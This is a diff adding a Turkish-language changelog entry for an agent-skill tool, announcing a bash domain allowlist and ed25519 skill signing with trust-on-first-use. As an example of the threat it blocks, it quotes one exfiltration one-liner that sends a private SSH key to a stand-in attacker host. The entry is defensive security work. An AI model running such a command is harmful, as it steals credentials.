@@ -5,6 +5,38 @@ formatı, [SemVer](https://semver.org) sürümleme.
 
 ## [Unreleased]
 
+## [0.9.0] - 2026-05-23
+
+### Eklendi
+- **🌐 Domain allowlist (Part A)** — skill `network.allowed_domains` belirtirse
+  bash komutları yalnız o domain'lere (+ alt-domain) erişebilir. Listede
+  olmayan hedef → komut çalıştırılmadan reddedilir. Klasik exfil combo'sunu
+  kapatır (`cat ~/.ssh/id_rsa | curl attacker.io`). `core/netfilter.py`.
+- **🔏 Skill imzalama (Part B)** — ed25519 + TOFU güven modeli (`core/signing.py`):
+  - `ajanox skill keygen [--out KEY]` — ed25519 anahtar çifti üret
+  - `ajanox skill sign DIR --key KEY` — SKILL.md'yi imzala → `SKILL.md.sig`
+    (detached, pubkey + signature)
+  - `ajanox skill verify DIR` — imza + TOFU doğrula
+  - İmza SKILL.md'nin tam byte'ları üzerinden → içerik değişirse `InvalidSignature`
+  - **TOFU** (trust-on-first-use): ilk kurulumda yazar pubkey'i
+    `~/.ajanox/trust/<skill>.pub`'a kaydedilir; sonraki güncellemede anahtar
+    değişirse yüksek sesle uyarır (exit 2) — kimlik sahteciliğini yakalar
+  - Trust dosya adı sanitize edilir (path traversal koruması)
+  - `cryptography` opsiyonel extra: `pip install 'ajanox[signing]'`; kurulu
+    değilse net hata, temel CLI etkilenmez
+- weather skill dogfood: `network.allowed_domains: [wttr.in]`
+- 35 yeni test (23 netfilter + 12 signing). Toplam: 207 test, hepsi pass
+
+### Güvenlik
+- Saldırı senaryoları doğrulandı: (1) içerik tamper → imza geçersiz;
+  (2) saldırgan kendi anahtarıyla yeniden imzalar → TOFU anahtar değişikliğini
+  yakalar; (3) izinsiz domain'e exfil → netfilter bloklar.
+
+### Notlar
+- İmza **userspace** doğrulama — marketplace'in `.sig` servis etmesi ve
+  install-flow otomatik doğrulaması sonraki adım. Kernel-seviyesi domain
+  zorlama (eBPF) v3.0.
+
 ## [0.8.0] - 2026-05-23
 
 ### Eklendi
